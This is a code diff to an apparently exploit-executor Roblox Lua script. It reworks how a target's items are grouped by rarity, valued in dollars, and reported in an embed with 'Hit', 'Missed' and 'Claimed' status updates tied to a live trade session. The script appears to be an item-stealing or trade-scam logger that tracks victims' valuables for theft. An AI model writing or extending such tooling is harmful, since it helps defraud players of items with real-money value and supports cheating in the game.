@@ -1508,13 +1508,58 @@ for i, v9 in ipairs(v4) do
 	break
 end
 
-local str9 = table.concat(fn27(tbl14), "\n")
-local n10 = #v4 - #tbl14
+-- group items by rarity with dollar values
+local rarityOrder = { "Chroma", "Ancient", "Unique", "Vintage", "Godly", "Legendary", "Epic", "Rare", "Uncommon", "Common", "Unknown" }
+local rarityGroups = {}
+local rarityGroupSet = {}
 
-if n10 > 0 then
-	str9 ..= string.format("\n... and %d more item%s", n10, n10 == 1 and "" or "s")
+for _, v9 in ipairs(v4) do
+	if v9.value > 0 then
+		local rarity = v9.rarity or "Unknown"
+		if not rarityGroupSet[rarity] then
+			rarityGroupSet[rarity] = {}
+		end
+		-- combine duplicates by displayName
+		local displayName = v9.displayName or v9.name
+		local found = false
+		for _, existing in ipairs(rarityGroupSet[rarity]) do
+			if existing.displayName == displayName then
+				existing.amount = existing.amount + (v9.amount or 1)
+				existing.totalValue = existing.totalValue + v9.totalValue
+				found = true
+				break
+			end
+		end
+		if not found then
+			table.insert(rarityGroupSet[rarity], {
+				displayName = displayName,
+				amount      = v9.amount or 1,
+				totalValue  = v9.totalValue,
+				emoji       = fn27({ v9 })[1]:match("^([^%s]+)") or "✨",
+			})
+		end
+	end
 end
 
+local str9Lines = {}
+for _, rarity in ipairs(rarityOrder) do
+	local group = rarityGroupSet[rarity]
+	if group and #group > 0 then
+		table.insert(str9Lines, rarity)
+		for _, item in ipairs(group) do
+			local dollars = string.format("~$%.2f", item.totalValue * 15 / 1000)
+			table.insert(str9Lines, string.format("%s x%d %s ➜ %s Value | %s", item.emoji, item.amount, item.displayName, fn26(item.totalValue), dollars))
+		end
+		table.insert(str9Lines, "")
+	end
+end
+
+local n10 = #v4 - #tbl14
+if n10 > 0 then
+	table.insert(str9Lines, string.format("... and %d more item%s", n10, n10 == 1 and "" or "s"))
+end
+
+local str9 = table.concat(str9Lines, "\n"):gsub("\n+$", "")
 local str10 = string.format("%.2f", n8 * 15 / 1000)
 local str11 = "💰 Total Value ➜ " .. fn26(n8) .. " / " .. str10 .. "$\n" .. "==============================\n\n" .. str9
 local v9 = identifyexecutor or getexecutorname
@@ -1619,7 +1664,7 @@ local function fn32()
 
 	local valuablesText = str9
 
-	-- initial status: Hit — Missed or Claimed are patched onto this same message later
+	-- initial status: In Progress — Missed or Claimed are patched onto this same message later
 	local statusText = "🔵 In Progress"
 
 	local fields = {
@@ -1699,6 +1744,11 @@ end
 
 -- PATCH the posted embed to show Missed — preserves all original fields
 local function fn32_update_missed(reason)
+	-- only mark Missed when a live trade session was actually in progress
+	local runtime = genv.ProjectVeloTradeRuntime
+	if runtime and (runtime.OtherPlayer == nil or runtime.OtherPlayer == "") then
+		return
+	end
 	reason = reason or "Missed"
 
 	local accountAgeDays = 0
